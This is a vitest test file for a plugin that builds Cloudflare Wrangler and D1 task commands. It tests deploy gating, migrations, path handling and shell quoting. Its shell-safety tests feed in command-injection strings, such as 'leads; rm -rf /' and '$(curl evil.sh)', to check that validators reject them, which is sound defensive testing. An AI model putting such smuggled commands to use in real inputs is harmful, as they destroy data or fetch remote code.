import { describe, expect, it } from "vitest";
import { d1Tasks, resolveMigrationsDir } from "./d1.js";
import { assertIdentifier, assertPort, join, quote, wranglerFlags } from "./shell.js";
import { wranglerTasks } from "./tasks.js";

type Cmd = Record<string, { command: string | string[]; cache?: boolean; inputs?: string[] }>;

describe("wranglerTasks", () => {
  it("emits the core Cloudflare task set", () => {
    const tasks = wranglerTasks({ config: "wrangler.jsonc" });
    expect(Object.keys(tasks)).toEqual(
      expect.arrayContaining(["cf:dev", "cf:deploy", "cf:preview", "cf:types", "cf:account"]),
    );
  });

  it("gates deploy behind the account check by default", () => {
    const tasks = wranglerTasks({ config: "wrangler.toml" }) as Cmd;
    const deploy = tasks["cf:deploy"]!;
    expect(Array.isArray(deploy.command)).toBe(true);
    expect((deploy.command as string[])[0]).toContain("account-check");
  });

  it("skips the guard when explicitly disabled", () => {
    const tasks = wranglerTasks({ guardAccount: false, config: "wrangler.toml" }) as Cmd;
    expect(tasks["cf:deploy"]!.command).toBe("wrangler deploy --config wrangler.toml");
  });

  it("threads --env through every task", () => {
    const tasks = wranglerTasks({ env: "dev", config: "wrangler.toml" }) as Cmd;
    expect(tasks["cf:dev"]!.command).toContain("--env dev");
    expect(tasks["cf:types"]!.command).toContain("--env dev");
    expect(tasks["cf:account"]!.command).toContain("--env dev");
  });

  it("adds D1 tasks only when a database is named", () => {
    expect(wranglerTasks({})).not.toHaveProperty("d1:migrate:local");
    expect(wranglerTasks({ d1: "leads" })).toHaveProperty("d1:migrate:local");
  });

  it("points the account check at the config it was given", () => {
    const tasks = wranglerTasks({ config: "wrangler.jsonc" }) as Cmd;
    expect(tasks["cf:account"]!.command).toContain("wrangler.jsonc");
    expect(tasks["cf:account"]!.command).not.toContain("wrangler.toml");
  });

  it("keeps cache inputs relative so keys are portable across machines", () => {
    const tasks = wranglerTasks({ config: "workers/api/wrangler.toml" }) as Cmd;
    for (const input of tasks["cf:types"]!.inputs ?? []) {
      expect(input.startsWith("/")).toBe(false);
    }
  });

  it("rejects a port that is not a real port", () => {
    expect(() => wranglerTasks({ port: 0 })).toThrow(/Invalid port/);
    expect(() => wranglerTasks({ port: 99999 })).toThrow(/Invalid port/);
  });
});

describe("d1Tasks", () => {
  it("separates local, remote, and status", () => {
    const tasks = d1Tasks({ database: "leads", env: "dev" }) as Cmd;
    expect(tasks["d1:migrate:local"]!.command).toContain("--local");
    expect(tasks["d1:migrate:remote"]!.command).toContain("--remote");
    expect(tasks["d1:migrate:local"]!.cache).toBe(false);
  });

  it("never puts --remote in the local task", () => {
    const tasks = d1Tasks({ database: "leads" }) as Cmd;
    expect(tasks["d1:migrate:local"]!.command).not.toContain("--remote");
  });
});

describe("shell safety", () => {
  it("quotes values containing metacharacters", () => {
    expect(quote("plain")).toBe("plain");
    expect(quote("has space")).toBe("'has space'");
    expect(quote("a;b")).toBe("'a;b'");
    expect(quote("$(whoami)")).toBe("'$(whoami)'");
    expect(quote("")).toBe("''");
  });

  it("escapes embedded single quotes", () => {
    // Closing, escaping, reopening is the only safe form inside single quotes.
    expect(quote("it's")).toBe("'it'\\''s'");
  });

  it("rejects injection attempts in a database name", () => {
    expect(() => d1Tasks({ database: "leads; rm -rf /" })).toThrow(/Invalid d1 database name/);
    expect(() => d1Tasks({ database: "$(curl evil.sh)" })).toThrow(/Invalid d1 database name/);
    expect(() => d1Tasks({ database: "a`id`" })).toThrow(/Invalid d1 database name/);
  });

  it("rejects injection attempts in an environment name", () => {
    expect(() => wranglerTasks({ env: "dev && curl evil.sh" })).toThrow(/Invalid env/);
  });

  it("quotes a config path containing a space rather than splitting it", () => {
    const tasks = wranglerTasks({ config: "My Project/wrangler.toml" }) as Cmd;
    expect(tasks["cf:types"]!.command).toContain("'My Project/wrangler.toml'");
  });

  it("quotes caller-supplied extra args", () => {
    const tasks = wranglerTasks({ config: "wrangler.toml", deployArgs: ["--var", "X=a b"] }) as Cmd;
    // guardAccount defaults on, so cf:deploy is [accountCheck, deployCommand].
    const [, deploy] = tasks["cf:deploy"]!.command as string[];
    expect(deploy).toContain("'X=a b'");
  });

  it("accepts ordinary identifiers", () => {
    expect(assertIdentifier("my-db_2", "x")).toBe("my-db_2");
    expect(() => assertIdentifier("-leading", "x")).toThrow();
    expect(() => assertIdentifier("", "x")).toThrow();
  });

  it("validates ports", () => {
    expect(assertPort(8787)).toBe("8787");
    expect(() => assertPort(1.5)).toThrow();
  });

  it("emits config and env flags in a stable order", () => {
    expect(wranglerFlags({ config: "w.toml", env: "dev" })).toEqual([
      "--config",
      "w.toml",
      "--env",
      "dev",
    ]);
    expect(wranglerFlags({})).toEqual([]);
  });

  it("collapses empty fragments instead of leaving double spaces", () => {
    expect(join("wrangler", "dev", "", null, undefined, "--remote")).toBe("wrangler dev --remote");
  });
});

describe("resolveMigrationsDir", () => {
  it("resolves relative to the config file, not the cwd", () => {
    const resolved = resolveMigrationsDir("/repo/workers/api/wrangler.toml", "migrations");
    expect(resolved).toBe("/repo/workers/api/migrations");
  });

  it("leaves absolute paths alone", () => {
    expect(resolveMigrationsDir("/repo/wrangler.toml", "/elsewhere/migrations")).toBe(
      "/elsewhere/migrations",
    );
  });

  it("defaults the directory name", () => {
    expect(resolveMigrationsDir("/repo/wrangler.toml")).toBe("/repo/migrations");
  });
});

describe("wrangler plugin configureServer", () => {
  it("accepts localhost requests with mixed-case Host header", async () => {
    const { wrangler } = await import("./plugin.js");
    const plugin = wrangler({ devEndpoint: true });

    let middlewareFn: Function | null = null;
    const mockServer = {
      middlewares: {
        use: (path: string, fn: Function) => {
          if (path === "/__wrangler/config") middlewareFn = fn;
        },
      },
    };

    (plugin as any).configureServer(mockServer);
    expect(middlewareFn).not.toBeNull();

    let statusCode = 200;
    let responseBody = "";
    const req = { headers: { host: "Localhost:5173" } };
    const res = {
      set statusCode(val: number) {
        statusCode = val;
      },
      setHeader: () => {},
      end: (data: string) => {
        responseBody = data;
      },
    };

    middlewareFn!(req, res);
    expect(statusCode).toBe(200);
    expect(responseBody).toContain('"configs"');
  });
});

